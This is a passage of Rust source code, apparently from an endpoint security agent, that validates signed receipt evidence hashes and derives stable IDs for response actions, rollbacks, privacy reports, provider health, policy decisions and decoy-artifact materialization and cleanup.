        for byte in part.as_bytes() {
            hash ^= u64::from(*byte);
            hash = hash.wrapping_mul(FNV_PRIME);
        }
        hash ^= 0xff;
        hash = hash.wrapping_mul(FNV_PRIME);
    }
    format!("{prefix}:{hash:016x}")
}

fn evidence_hash_for_value(value: impl AsRef<str>) -> String {
    sha256(value.as_ref().as_bytes()).to_hex_prefixed()
}

fn insert_json<T: Serialize>(map: &mut BTreeMap<String, serde_json::Value>, key: &str, value: T) {
    if let Ok(value) = serde_json::to_value(value) {
        if !value.is_null() {
            map.insert(key.to_string(), value);
        }
    }
}

fn require_field_eq(actual: &str, expected: &str, field_name: &str) -> Result<()> {
    if actual == expected {
        return Ok(());
    }
    Err(anyhow!(
        "{field_name} must be {expected}, got {}",
        if actual.is_empty() {
            "<missing>"
        } else {
            actual
        }
    ))
}

fn require_nonempty(value: &str, field_name: &str) -> Result<()> {
    if !value.trim().is_empty() {
        return Ok(());
    }
    Err(anyhow!("{field_name} is required"))
}

fn require_optional_nonempty(value: Option<&str>, field_name: &str) -> Result<()> {
    match value.map(str::trim).filter(|value| !value.is_empty()) {
        Some(_) => Ok(()),
        None => Err(anyhow!("{field_name} is required")),
    }
}

fn require_nonzero(value: u64, field_name: &str) -> Result<()> {
    if value > 0 {
        return Ok(());
    }
    Err(anyhow!("{field_name} is required"))
}

fn require_confidence(value: Option<f32>, field_name: &str) -> Result<()> {
    match value {
        Some(value) if value.is_finite() && (0.0..=1.0).contains(&value) => Ok(()),
        Some(_) => Err(anyhow!("{field_name} must be between 0.0 and 1.0")),
        None => Err(anyhow!("{field_name} is required")),
    }
}

fn require_receipt_evidence(evidence: &[EndpointReceiptEvidence]) -> Result<()> {
    if evidence.is_empty() {
        return Err(anyhow!("endpoint receipt evidence is required"));
    }
    let mut evidence_keys = BTreeSet::new();
    for item in evidence {
        require_nonempty(item.key.as_str(), "endpoint receipt evidence key")?;
        let evidence_key = item.key.trim();
        if !evidence_keys.insert(evidence_key) {
            return Err(anyhow!(
                "duplicate evidence key {evidence_key} in endpoint receipt"
            ));
        }
        require_nonempty(
            item.value_hash.as_str(),
            "endpoint receipt evidence value hash",
        )?;
        Hash::from_hex(item.value_hash.as_str())
            .with_context(|| "endpoint receipt evidence value hash must be a 32-byte hex hash")?;
        if let Some(raw_value) = item.raw_value.as_deref() {
            if item.redaction_class != EndpointEvidenceRedactionClass::RawArtifactPermitted {
                return Err(anyhow!(
                    "endpoint receipt raw evidence requires raw artifact permitted redaction"
                ));
            }
            require_nonempty(raw_value, "endpoint receipt evidence raw value")?;
            let raw_value_hash = sha256(raw_value.as_bytes()).to_hex_prefixed();
            if item.value_hash != raw_value_hash {
                return Err(anyhow!(
                    "endpoint receipt raw evidence hash does not match raw evidence value"
                ));
            }
        }
    }
    Ok(())
}

fn require_evidence_value_hash(
    evidence: &[EndpointReceiptEvidence],
    key: &str,
    expected_value: impl AsRef<str>,
    field_name: &str,
) -> Result<()> {
    let Some(item) = evidence.iter().find(|item| item.key == key) else {
        return Err(anyhow!("{field_name} is required"));
    };
    let expected_hash = sha256(expected_value.as_ref().as_bytes()).to_hex_prefixed();
    if item.value_hash != expected_hash {
        return Err(anyhow!("{field_name} hash must match signed receipt field"));
    }
    Ok(())
}

fn require_response_request_receipt_evidence(
    decision: &EndpointDecisionRecord,
    evidence: &[EndpointReceiptEvidence],
    root_node_id: &str,
    graph_slice_id: &str,
    graph_content_hash: Option<&str>,
    ttl_seconds: u64,
    rollback_ref: &str,
) -> Result<()> {
    let dry_run = response_request_dry_run_from_decision(decision)?;
    let response_action_id = response_action_id_from_signed_response_fields_with_mode(
        root_node_id,
        graph_slice_id,
        &decision.action,
        ttl_seconds,
        if dry_run { "dry_run" } else { "execute" },
    );
    if decision.finding_id.as_deref() != Some(response_action_id.as_str()) {
        return Err(anyhow!(
            "response action id evidence hash must match signed response action fields"
        ));
    }
    let expected_rollback_ref =
        expected_response_rollback_ref(&decision.action, dry_run, &response_action_id);
    if rollback_ref != expected_rollback_ref {
        return Err(anyhow!(
            "response rollback evidence hash must match signed response action fields"
        ));
    }
    require_response_receipt_evidence_fields(
        evidence,
        response_action_id.as_str(),
        root_node_id,
        graph_slice_id,
        graph_content_hash,
        ttl_seconds,
        rollback_ref,
    )
}

fn require_response_receipt_evidence(
    evidence: &[EndpointReceiptEvidence],
    action: &EndpointDecisionAction,
    root_node_id: &str,
    graph_slice_id: &str,
    ttl_seconds: u64,
    rollback_ref: &str,
) -> Result<()> {
    let response_action_id = response_action_id_from_signed_response_fields(
        root_node_id,
        graph_slice_id,
        action,
        ttl_seconds,
    );
    require_evidence_value_hash(
        evidence,
        "responseActionId",
        response_action_id.as_str(),
        "response action id evidence",
    )?;
    let expected_rollback_ref = expected_live_response_rollback_ref(action, &response_action_id);
    if rollback_ref != expected_rollback_ref {
        return Err(anyhow!(
            "response rollback evidence hash must match signed response action fields"
        ));
    }
    require_response_receipt_evidence_fields(
        evidence,
        response_action_id.as_str(),
        root_node_id,
        graph_slice_id,
        None,
        ttl_seconds,
        rollback_ref,
    )
}

fn require_response_receipt_evidence_fields(
    evidence: &[EndpointReceiptEvidence],
    response_action_id: &str,
    root_node_id: &str,
    graph_slice_id: &str,
    graph_content_hash: Option<&str>,
    ttl_seconds: u64,
    rollback_ref: &str,
) -> Result<()> {
    require_evidence_value_hash(
        evidence,
        "responseActionId",
        response_action_id,
        "response action id evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "rootNodeId",
        root_node_id,
        "response root node evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "graphSliceId",
        graph_slice_id,
        "response graph slice evidence",
    )?;
    if let Some(graph_content_hash) = graph_content_hash {
        require_evidence_value_hash(
            evidence,
            "contentHash",
            graph_content_hash,
            "response graph content hash evidence",
        )?;
    }
    require_evidence_value_hash(
        evidence,
        "ttlSeconds",
        ttl_seconds.to_string(),
        "response ttl evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "rollbackRef",
        rollback_ref,
        "response rollback evidence",
    )?;
    Ok(())
}

fn response_action_id_from_signed_response_fields(
    root_node_id: &str,
    graph_slice_id: &str,
    action: &EndpointDecisionAction,
    ttl_seconds: u64,
) -> String {
    response_action_id_from_signed_response_fields_with_mode(
        root_node_id,
        graph_slice_id,
        action,
        ttl_seconds,
        "execute",
    )
}

fn response_action_id_from_signed_response_fields_with_mode(
    root_node_id: &str,
    graph_slice_id: &str,
    action: &EndpointDecisionAction,
    ttl_seconds: u64,
    mode: &str,
) -> String {
    let ttl = ttl_seconds.to_string();
    stable_id(
        "response_action",
        [
            root_node_id,
            graph_slice_id,
            action.as_str(),
            mode,
            ttl.as_str(),
        ],
    )
}

fn expected_response_rollback_ref(
    action: &EndpointDecisionAction,
    dry_run: bool,
    response_action_id: &str,
) -> String {
    if !dry_run && action == &EndpointDecisionAction::CollectEvidence {
        format!("rollback:noop:{response_action_id}")
    } else {
        format!("rollback:{response_action_id}")
    }
}

fn expected_live_response_rollback_ref(
    action: &EndpointDecisionAction,
    response_action_id: &str,
) -> String {
    expected_response_rollback_ref(action, false, response_action_id)
}

fn telemetry_privacy_report_id_from_values(
    privacy_mode: &str,
    raw_artifact_upload_permitted: bool,
    raw_artifact_approval_id: Option<&str>,
    raw_artifact_approval_reason_hash: Option<&str>,
    count_values: [&str; 7],
) -> String {
    let privacy_mode_hash = sha256(privacy_mode.as_bytes()).to_hex_prefixed();
    let raw_permitted = raw_artifact_upload_permitted.to_string();
    let raw_permitted_hash = sha256(raw_permitted.as_bytes()).to_hex_prefixed();
    let observation_count_hash = sha256(count_values[0].as_bytes()).to_hex_prefixed();
    let field_count_hash = sha256(count_values[1].as_bytes()).to_hex_prefixed();
    let hash_only_count_hash = sha256(count_values[2].as_bytes()).to_hex_prefixed();
    let metadata_only_count_hash = sha256(count_values[3].as_bytes()).to_hex_prefixed();
    let redacted_count_hash = sha256(count_values[4].as_bytes()).to_hex_prefixed();
    let raw_suppressed_count_hash = sha256(count_values[5].as_bytes()).to_hex_prefixed();
    let local_only_count_hash = sha256(count_values[6].as_bytes()).to_hex_prefixed();
    let mut evidence_hashes = vec![
        privacy_mode_hash.as_str(),
        raw_permitted_hash.as_str(),
        observation_count_hash.as_str(),
        field_count_hash.as_str(),
        hash_only_count_hash.as_str(),
        metadata_only_count_hash.as_str(),
        redacted_count_hash.as_str(),
        raw_suppressed_count_hash.as_str(),
        local_only_count_hash.as_str(),
    ];
    let raw_artifact_approval_id_hash =
        raw_artifact_approval_id.map(|value| sha256(value.as_bytes()).to_hex_prefixed());
    let raw_artifact_approval_reason_hash_hash =
        raw_artifact_approval_reason_hash.map(|value| sha256(value.as_bytes()).to_hex_prefixed());
    let empty_hash = sha256(b"").to_hex_prefixed();
    if raw_artifact_upload_permitted {
        evidence_hashes.push(
            raw_artifact_approval_id_hash
                .as_deref()
                .unwrap_or(empty_hash.as_str()),
        );
        evidence_hashes.push(
            raw_artifact_approval_reason_hash_hash
                .as_deref()
                .unwrap_or(empty_hash.as_str()),
        );
    }
    telemetry_privacy_report_id_from_evidence_hashes(evidence_hashes)
}

fn telemetry_privacy_report_id_from_evidence(
    evidence: &[EndpointReceiptEvidence],
) -> Result<String> {
    let raw_artifact_upload_permitted_hash = evidence_value_hash(
        evidence,
        "rawArtifactUploadPermitted",
        "privacy report raw artifact permission evidence",
    )?;
    let mut evidence_hashes = vec![
        evidence_value_hash(evidence, "privacyMode", "privacy report mode evidence")?,
        raw_artifact_upload_permitted_hash,
        evidence_value_hash(
            evidence,
            "observationCount",
            "privacy report observation count evidence",
        )?,
        evidence_value_hash(
            evidence,
            "fieldCount",
            "privacy report field count evidence",
        )?,
        evidence_value_hash(
            evidence,
            "hashOnlyCount",
            "privacy report hash-only count evidence",
        )?,
        evidence_value_hash(
            evidence,
            "metadataOnlyCount",
            "privacy report metadata-only count evidence",
        )?,
        evidence_value_hash(
            evidence,
            "redactedCount",
            "privacy report redacted count evidence",
        )?,
        evidence_value_hash(
            evidence,
            "rawSuppressedCount",
            "privacy report raw suppressed count evidence",
        )?,
        evidence_value_hash(
            evidence,
            "localOnlyCount",
            "privacy report local-only count evidence",
        )?,
    ];
    let true_hash = sha256(b"true").to_hex_prefixed();
    if hex_strings_match(raw_artifact_upload_permitted_hash, true_hash.as_str()) {
        evidence_hashes.push(evidence_value_hash(
            evidence,
            "rawArtifactApprovalId",
            "privacy report raw artifact approval id evidence",
        )?);
        evidence_hashes.push(evidence_value_hash(
            evidence,
            "rawArtifactApprovalReasonHash",
            "privacy report raw artifact approval reason hash evidence",
        )?);
    }
    Ok(telemetry_privacy_report_id_from_evidence_hashes(
        evidence_hashes,
    ))
}

fn telemetry_privacy_report_id_from_evidence_hashes<'a>(
    evidence_hashes: impl IntoIterator<Item = &'a str>,
) -> String {
    stable_id("telemetry_privacy_report", evidence_hashes)
}

fn provider_degradation_id_from_provider(
    endpoint_id: &str,
    policy_hash: &str,
    provider: &EndpointProviderState,
) -> String {
    let provider_kind = camel_debug_to_snake(format!("{:?}", provider.provider_kind).as_str());
    let reasons = provider.degradation_reasons.join("|");
    let dropped_event_count = provider.dropped_event_count.to_string();
    let deadline_miss_count = provider.deadline_miss_count.to_string();
    let full_disk_access =
        endpoint_provider_full_disk_access_evidence_value(provider.full_disk_access);
    let provider_id_hash = sha256(provider.provider_id.as_bytes()).to_hex_prefixed();
    let provider_kind_hash = sha256(provider_kind.as_bytes()).to_hex_prefixed();
    let installed_hash = sha256(provider.installed.to_string().as_bytes()).to_hex_prefixed();
    let active_hash = sha256(provider.active.to_string().as_bytes()).to_hex_prefixed();
    let healthy_hash = sha256(provider.healthy.to_string().as_bytes()).to_hex_prefixed();
    let degraded_hash = sha256(provider.degraded.to_string().as_bytes()).to_hex_prefixed();
    let reasons_hash = sha256(reasons.as_bytes()).to_hex_prefixed();
    let dropped_event_count_hash = sha256(dropped_event_count.as_bytes()).to_hex_prefixed();
    let deadline_miss_count_hash = sha256(deadline_miss_count.as_bytes()).to_hex_prefixed();
    let full_disk_access_hash = sha256(full_disk_access.as_bytes()).to_hex_prefixed();
    provider_degradation_id_from_evidence_hashes(
        endpoint_id,
        policy_hash,
        [
            provider_id_hash.as_str(),
            provider_kind_hash.as_str(),
            installed_hash.as_str(),
            active_hash.as_str(),
            healthy_hash.as_str(),
            degraded_hash.as_str(),
            reasons_hash.as_str(),
            dropped_event_count_hash.as_str(),
            deadline_miss_count_hash.as_str(),
            full_disk_access_hash.as_str(),
        ],
    )
}

fn provider_degradation_id_from_evidence(
    evidence: &[EndpointReceiptEvidence],
    endpoint_id: &str,
    policy_hash: &str,
) -> Result<String> {
    Ok(provider_degradation_id_from_evidence_hashes(
        endpoint_id,
        policy_hash,
        [
            evidence_value_hash(
                evidence,
                "providerId",
                "provider degradation provider id evidence",
            )?,
            evidence_value_hash(
                evidence,
                "providerKind",
                "provider degradation provider kind evidence",
            )?,
            evidence_value_hash(
                evidence,
                "installed",
                "provider degradation installed evidence",
            )?,
            evidence_value_hash(evidence, "active", "provider degradation active evidence")?,
            evidence_value_hash(evidence, "healthy", "provider degradation healthy evidence")?,
            evidence_value_hash(
                evidence,
                "degraded",
                "provider degradation degraded evidence",
            )?,
            evidence_value_hash(
                evidence,
                "degradationReasons",
                "provider degradation reasons evidence",
            )?,
            evidence_value_hash(
                evidence,
                "droppedEventCount",
                "provider degradation dropped-event count evidence",
            )?,
            evidence_value_hash(
                evidence,
                "deadlineMissCount",
                "provider degradation deadline-miss count evidence",
            )?,
            evidence_value_hash(
                evidence,
                "fullDiskAccess",
                "provider degradation full-disk-access evidence",
            )?,
        ],
    ))
}

fn provider_degradation_id_from_evidence_hashes(
    endpoint_id: &str,
    policy_hash: &str,
    evidence_hashes: [&str; 10],
) -> String {
    stable_id(
        "provider_degradation",
        [
            endpoint_id,
            policy_hash,
            evidence_hashes[0],
            evidence_hashes[1],
            evidence_hashes[2],
            evidence_hashes[3],
            evidence_hashes[4],
            evidence_hashes[5],
            evidence_hashes[6],
            evidence_hashes[7],
            evidence_hashes[8],
            evidence_hashes[9],
        ],
    )
}

fn endpoint_provider_full_disk_access_evidence_value(value: Option<bool>) -> &'static str {
    match value {
        Some(true) => "true",
        Some(false) => "false",
        None => "unknown",
    }
}

fn policy_decision_id_from_fields(
    endpoint_id: &str,
    policy_hash: &str,
    action_type: &str,
    target: &str,
    allowed: bool,
    guard: &str,
) -> String {
    let target_evidence_hash = sha256(target.as_bytes()).to_hex_prefixed();
    let guard_evidence_hash = sha256(guard.as_bytes()).to_hex_prefixed();
    policy_decision_id_from_evidence_hashes(
        endpoint_id,
        policy_hash,
        action_type,
        target_evidence_hash.as_str(),
        allowed,
        guard_evidence_hash.as_str(),
    )
}

fn policy_decision_id_from_evidence(
    evidence: &[EndpointReceiptEvidence],
    endpoint_id: &str,
    policy_hash: &str,
    action_type: &str,
    allowed: bool,
) -> Result<String> {
    let target_evidence_hash =
        evidence_value_hash(evidence, "target", "policy decision target evidence")?;
    let guard_evidence_hash =
        evidence_value_hash(evidence, "guard", "policy decision guard evidence")?;
    Ok(policy_decision_id_from_evidence_hashes(
        endpoint_id,
        policy_hash,
        action_type,
        target_evidence_hash,
        allowed,
        guard_evidence_hash,
    ))
}

fn policy_decision_id_from_evidence_hashes(
    endpoint_id: &str,
    policy_hash: &str,
    action_type: &str,
    target_evidence_hash: &str,
    allowed: bool,
    guard_evidence_hash: &str,
) -> String {
    let allowed_text = allowed.to_string();
    stable_id(
        "policy_decision",
        [
            endpoint_id,
            policy_hash,
            action_type,
            target_evidence_hash,
            allowed_text.as_str(),
            guard_evidence_hash,
        ],
    )
}

fn require_subgraph_reference(graph: &EndpointGraphReference, label: &str) -> Result<()> {
    let root_node_id = graph
        .process_node_id
        .as_deref()
        .ok_or_else(|| anyhow!("{label} graph root reference is required"))?;
    if !graph.node_ids.iter().any(|node_id| node_id == root_node_id) {
        return Err(anyhow!(
            "{label} graph root reference must be included in graph node ids"
        ));
    }

    let graph_slice_id = graph
        .graph_slice_id
        .as_deref()
        .ok_or_else(|| anyhow!("{label} graph slice reference is required"))?;
    let node_count = graph.node_ids.len().to_string();
    let edge_count = graph.edge_ids.len().to_string();
    let expected_graph_slice_id = stable_id(
        "graph_slice",
        [root_node_id, node_count.as_str(), edge_count.as_str()],
    );
    if graph_slice_id != expected_graph_slice_id {
        return Err(anyhow!(
            "{label} graph slice reference must match root and graph counts"
        ));
    }
    Ok(())
}

fn require_response_family_id_evidence(
    evidence: &[EndpointReceiptEvidence],
    key: &str,
    signed_id: Option<&str>,
    field_name: &str,
) -> Result<()> {
    let signed_id = signed_id.ok_or_else(|| anyhow!("{field_name} signed id is required"))?;
    require_evidence_value_hash(evidence, key, signed_id, field_name)
}

fn require_response_request_dry_run_evidence(
    decision: &EndpointDecisionRecord,
    evidence: &[EndpointReceiptEvidence],
) -> Result<()> {
    let expected_dry_run = if response_request_dry_run_from_decision(decision)? {
        "true"
    } else {
        "false"
    };
    require_evidence_value_hash(
        evidence,
        "dryRun",
        expected_dry_run,
        "response dry-run evidence",
    )
}

fn response_request_dry_run_from_decision(decision: &EndpointDecisionRecord) -> Result<bool> {
    let title = decision
        .title
        .as_deref()
        .ok_or_else(|| anyhow!("response request title is required"))?;
    match title {
        "Endpoint response action dry run planned" => Ok(true),
        "Endpoint response action planned" => Ok(false),
        _ => Err(anyhow!("response request title is invalid")),
    }
}

fn require_response_reason_evidence(evidence: &[EndpointReceiptEvidence]) -> Result<()> {
    let Some(item) = evidence.iter().find(|item| item.key == "reason") else {
        return Err(anyhow!("response reason evidence is required"));
    };
    let empty_reason_hash = sha256(b"").to_hex_prefixed();
    if item.value_hash == empty_reason_hash {
        return Err(anyhow!("response reason evidence must not be empty"));
    }
    Ok(())
}

fn require_response_execution_id_evidence(
    evidence: &[EndpointReceiptEvidence],
    decision: &EndpointDecisionRecord,
    root_node_id: &str,
    graph_slice_id: &str,
    graph_content_hash: Option<&str>,
) -> Result<()> {
    require_response_family_id_evidence(
        evidence,
        "executionId",
        decision.finding_id.as_deref(),
        "execution id evidence",
    )?;
    let Some(expected_execution_id) = response_execution_id_from_signed_fields(
        decision,
        root_node_id,
        graph_slice_id,
        graph_content_hash,
        evidence,
    )?
    else {
        return Ok(());
    };
    if decision.finding_id.as_deref() != Some(expected_execution_id.as_str()) {
        return Err(anyhow!(
            "execution id evidence hash must match signed response action fields"
        ));
    }
    require_evidence_value_hash(
        evidence,
        "executionId",
        expected_execution_id.as_str(),
        "execution id evidence",
    )
}

fn require_response_execution_evidence_bundle_evidence(
    evidence: &[EndpointReceiptEvidence],
    decision: &EndpointDecisionRecord,
    root_node_id: &str,
    graph_slice_id: &str,
    graph_content_hash: Option<&str>,
) -> Result<()> {
    let graph_content_hash = graph_content_hash
        .ok_or_else(|| anyhow!("execution evidence bundle graph content hash is required"))?;
    let evidence_bundle_id = response_execution_bundle_id_from_signed_fields(
        decision,
        root_node_id,
        graph_slice_id,
        graph_content_hash,
    )?;
    require_evidence_value_hash(
        evidence,
        "evidenceBundleId",
        evidence_bundle_id.as_str(),
        "execution evidence bundle id evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "evidenceBundleContentHash",
        graph_content_hash,
        "execution evidence bundle content hash evidence",
    )
}

fn response_execution_id_from_signed_fields(
    decision: &EndpointDecisionRecord,
    root_node_id: &str,
    graph_slice_id: &str,
    graph_content_hash: Option<&str>,
    evidence: &[EndpointReceiptEvidence],
) -> Result<Option<String>> {
    let status = response_execution_status_from_decision(decision)?;
    let graph_content_hash =
        graph_content_hash.ok_or_else(|| anyhow!("execution id graph content hash is required"))?;
    let evidence_bundle_id = response_execution_bundle_id_from_signed_fields(
        decision,
        root_node_id,
        graph_slice_id,
        graph_content_hash,
    )?;
    let ttl_seconds = decision
        .ttl_seconds
        .ok_or_else(|| anyhow!("response ttl seconds is required"))?;
    let response_action_id = response_action_id_from_signed_response_fields(
        root_node_id,
        graph_slice_id,
        &decision.action,
        ttl_seconds,
    );
    if let Some(prefix) = response_execution_transition_id_prefix(status) {
        let rollback_ref = decision
            .rollback_ref
            .as_deref()
            .ok_or_else(|| anyhow!("response rollback ref is required"))?;
        let reason_hash = response_execution_reason_evidence_hash(evidence)?;
        return Ok(Some(response_execution_transition_id_from_reason_hash(
            prefix,
            response_action_id.as_str(),
            evidence_bundle_id.as_str(),
            rollback_ref,
            reason_hash,
        )));
    }
    if let Some(effect_binding_digest) =
        response_execution_effect_binding_digest_from_evidence(evidence)?
    {
        if decision.action == EndpointDecisionAction::CollectEvidence {
            return Err(anyhow!(
                "collect evidence execution effect evidence is invalid"
            ));
        }
        return Ok(Some(response_execution_id_from_effect_digest(
            response_action_id.as_str(),
            evidence_bundle_id.as_str(),
            effect_binding_digest.as_str(),
        )));
    }
    if decision.action != EndpointDecisionAction::CollectEvidence {
        return Err(anyhow!("execution effect evidence is required"));
    }
    Ok(Some(stable_id(
        "response_execution",
        [
            response_action_id.as_str(),
            evidence_bundle_id.as_str(),
            graph_content_hash,
        ],
    )))
}

fn response_execution_transition_id_prefix(status: &str) -> Option<&'static str> {
    match status {
        "failed" => Some("response_execution_failed"),
        "partial" => Some("response_execution_partial"),
        "expired" => Some("response_execution_expired"),
        "cancelled" => Some("response_execution_cancelled"),
        "rolled_back" => Some("response_execution_rolled_back"),
        _ => None,
    }
}

fn response_execution_reason_evidence_hash(evidence: &[EndpointReceiptEvidence]) -> Result<&str> {
    let Some(reason) = evidence.iter().find(|item| item.key == "reason") else {
        return Err(anyhow!("response transition reason evidence is required"));
    };
    require_evidence_hash_not_empty(reason, "response transition reason evidence")?;
    Ok(reason.value_hash.as_str())
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct ResponseExecutionEffectBindingEntry {
    key: String,
    value_hash: String,
}

fn response_execution_id_from_effects(
    response_action_id: &str,
    evidence_bundle_id: &str,
    effects: &[EndpointResponseExecutionEffect],
) -> Result<String> {
    let effect_binding_digest = response_execution_effect_binding_digest_from_effects(effects)?
        .ok_or_else(|| anyhow!("response execution effect binding requires at least one effect"))?;
    Ok(response_execution_id_from_effect_digest(
        response_action_id,
        evidence_bundle_id,
        effect_binding_digest.as_str(),
    ))
}

fn response_execution_id_from_effect_digest(
    response_action_id: &str,
    evidence_bundle_id: &str,
    effect_binding_digest: &str,
) -> String {
    stable_id(
        "response_execution",
        [
            response_action_id,
            evidence_bundle_id,
            effect_binding_digest,
        ],
    )
}

fn response_execution_transition_id_from_reason_hash(
    prefix: &str,
    response_action_id: &str,
    evidence_bundle_id: &str,
    rollback_ref: &str,
    reason_hash: &str,
) -> String {
    stable_id(
        prefix,
        [
            response_action_id,
            evidence_bundle_id,
            rollback_ref,
            reason_hash,
        ],
    )
}

struct DeceptionMaterializationIdValues<'a> {
    plan_root: &'a str,
    plan_hash: &'a str,
    report_hash: &'a str,
    artifact_count: &'a str,
    created_count: &'a str,
    skipped_count: &'a str,
    registered_artifact_count: &'a str,
    artifact_ids: &'a str,
}

struct DeceptionMaterializationIdEvidenceHashes<'a> {
    plan_root_evidence_hash: &'a str,
    plan_hash_evidence_hash: &'a str,
    report_hash_evidence_hash: &'a str,
    artifact_count_evidence_hash: &'a str,
    created_count_evidence_hash: &'a str,
    skipped_count_evidence_hash: &'a str,
    registered_artifact_count_evidence_hash: &'a str,
    artifact_ids_evidence_hash: &'a str,
}

fn deception_materialization_id_from_hashes(
    endpoint_id: &str,
    policy_hash: &str,
    values: DeceptionMaterializationIdValues<'_>,
) -> String {
    let plan_root_evidence_hash = sha256(values.plan_root.as_bytes()).to_hex_prefixed();
    let plan_hash_evidence_hash = sha256(values.plan_hash.as_bytes()).to_hex_prefixed();
    let report_hash_evidence_hash = sha256(values.report_hash.as_bytes()).to_hex_prefixed();
    let artifact_count_evidence_hash = sha256(values.artifact_count.as_bytes()).to_hex_prefixed();
    let created_count_evidence_hash = sha256(values.created_count.as_bytes()).to_hex_prefixed();
    let skipped_count_evidence_hash = sha256(values.skipped_count.as_bytes()).to_hex_prefixed();
    let registered_artifact_count_evidence_hash =
        sha256(values.registered_artifact_count.as_bytes()).to_hex_prefixed();
    let artifact_ids_evidence_hash = sha256(values.artifact_ids.as_bytes()).to_hex_prefixed();
    deception_materialization_id_from_evidence_hashes(
        endpoint_id,
        policy_hash,
        DeceptionMaterializationIdEvidenceHashes {
            plan_root_evidence_hash: plan_root_evidence_hash.as_str(),
            plan_hash_evidence_hash: plan_hash_evidence_hash.as_str(),
            report_hash_evidence_hash: report_hash_evidence_hash.as_str(),
            artifact_count_evidence_hash: artifact_count_evidence_hash.as_str(),
            created_count_evidence_hash: created_count_evidence_hash.as_str(),
            skipped_count_evidence_hash: skipped_count_evidence_hash.as_str(),
            registered_artifact_count_evidence_hash: registered_artifact_count_evidence_hash
                .as_str(),
            artifact_ids_evidence_hash: artifact_ids_evidence_hash.as_str(),
        },
    )
}

fn deception_materialization_id_from_evidence(
    evidence: &[EndpointReceiptEvidence],
    endpoint_id: &str,
    policy_hash: &str,
) -> Result<String> {
    let plan_root_evidence_hash = evidence_value_hash(
        evidence,
        "deceptionPlanRoot",
        "deception materialization plan root evidence",
    )?;
    let plan_hash_evidence_hash = evidence_value_hash(
        evidence,
        "deceptionPlanHash",
        "deception materialization plan hash evidence",
    )?;
    let report_hash_evidence_hash = evidence_value_hash(
        evidence,
        "materializationReportHash",
        "deception materialization report hash evidence",
    )?;
    let artifact_count_evidence_hash = evidence_value_hash(
        evidence,
        "artifactCount",
        "deception materialization artifact count evidence",
    )?;
    let created_count_evidence_hash = evidence_value_hash(
        evidence,
        "createdCount",
        "deception materialization created count evidence",
    )?;
    let skipped_count_evidence_hash = evidence_value_hash(
        evidence,
        "skippedCount",
        "deception materialization skipped count evidence",
    )?;
    let registered_artifact_count_evidence_hash = evidence_value_hash(
        evidence,
        "registeredArtifactCount",
        "deception materialization registered artifact count evidence",
    )?;
    let artifact_ids_evidence_hash = evidence_value_hash(
        evidence,
        "artifactIds",
        "deception materialization artifact ids evidence",
    )?;
    Ok(deception_materialization_id_from_evidence_hashes(
        endpoint_id,
        policy_hash,
        DeceptionMaterializationIdEvidenceHashes {
            plan_root_evidence_hash,
            plan_hash_evidence_hash,
            report_hash_evidence_hash,
            artifact_count_evidence_hash,
            created_count_evidence_hash,
            skipped_count_evidence_hash,
            registered_artifact_count_evidence_hash,
            artifact_ids_evidence_hash,
        },
    ))
}

fn deception_materialization_id_from_evidence_hashes(
    endpoint_id: &str,
    policy_hash: &str,
    evidence_hashes: DeceptionMaterializationIdEvidenceHashes<'_>,
) -> String {
    stable_id(
        "deception_materialization",
        [
            endpoint_id,
            policy_hash,
            evidence_hashes.plan_root_evidence_hash,
            evidence_hashes.plan_hash_evidence_hash,
            evidence_hashes.report_hash_evidence_hash,
            evidence_hashes.artifact_count_evidence_hash,
            evidence_hashes.created_count_evidence_hash,
            evidence_hashes.skipped_count_evidence_hash,
            evidence_hashes.registered_artifact_count_evidence_hash,
            evidence_hashes.artifact_ids_evidence_hash,
        ],
    )
}

struct DeceptionCleanupIdValues<'a> {
    plan_root: &'a str,
    plan_hash: &'a str,
    report_hash: &'a str,
    artifact_count: &'a str,
    dry_run: &'a str,
    removed_count: &'a str,
    would_remove_count: &'a str,
    missing_count: &'a str,
    refused_count: &'a str,
    deregistered_artifact_count: &'a str,
    remaining_registered_artifact_count: &'a str,
}

struct DeceptionCleanupIdEvidenceHashes<'a> {
    plan_root_evidence_hash: &'a str,
    plan_hash_evidence_hash: &'a str,
    report_hash_evidence_hash: &'a str,
    artifact_count_evidence_hash: &'a str,
    dry_run_evidence_hash: &'a str,
    removed_count_evidence_hash: &'a str,
    would_remove_count_evidence_hash: &'a str,
    missing_count_evidence_hash: &'a str,
    refused_count_evidence_hash: &'a str,
    deregistered_artifact_count_evidence_hash: &'a str,
    remaining_registered_artifact_count_evidence_hash: &'a str,
}

fn deception_cleanup_id_from_hashes(
    endpoint_id: &str,
    policy_hash: &str,
    values: DeceptionCleanupIdValues<'_>,
) -> String {
    let plan_root_evidence_hash = sha256(values.plan_root.as_bytes()).to_hex_prefixed();
    let plan_hash_evidence_hash = sha256(values.plan_hash.as_bytes()).to_hex_prefixed();
    let report_hash_evidence_hash = sha256(values.report_hash.as_bytes()).to_hex_prefixed();
    let artifact_count_evidence_hash = sha256(values.artifact_count.as_bytes()).to_hex_prefixed();
    let dry_run_evidence_hash = sha256(values.dry_run.as_bytes()).to_hex_prefixed();
    let removed_count_evidence_hash = sha256(values.removed_count.as_bytes()).to_hex_prefixed();
    let would_remove_count_evidence_hash =
        sha256(values.would_remove_count.as_bytes()).to_hex_prefixed();
    let missing_count_evidence_hash = sha256(values.missing_count.as_bytes()).to_hex_prefixed();
    let refused_count_evidence_hash = sha256(values.refused_count.as_bytes()).to_hex_prefixed();
    let deregistered_artifact_count_evidence_hash =
        sha256(values.deregistered_artifact_count.as_bytes()).to_hex_prefixed();
    let remaining_registered_artifact_count_evidence_hash =
        sha256(values.remaining_registered_artifact_count.as_bytes()).to_hex_prefixed();
    deception_cleanup_id_from_evidence_hashes(
        endpoint_id,
        policy_hash,
        DeceptionCleanupIdEvidenceHashes {
            plan_root_evidence_hash: plan_root_evidence_hash.as_str(),
            plan_hash_evidence_hash: plan_hash_evidence_hash.as_str(),
            report_hash_evidence_hash: report_hash_evidence_hash.as_str(),
            artifact_count_evidence_hash: artifact_count_evidence_hash.as_str(),
            dry_run_evidence_hash: dry_run_evidence_hash.as_str(),
            removed_count_evidence_hash: removed_count_evidence_hash.as_str(),
            would_remove_count_evidence_hash: would_remove_count_evidence_hash.as_str(),
            missing_count_evidence_hash: missing_count_evidence_hash.as_str(),
            refused_count_evidence_hash: refused_count_evidence_hash.as_str(),
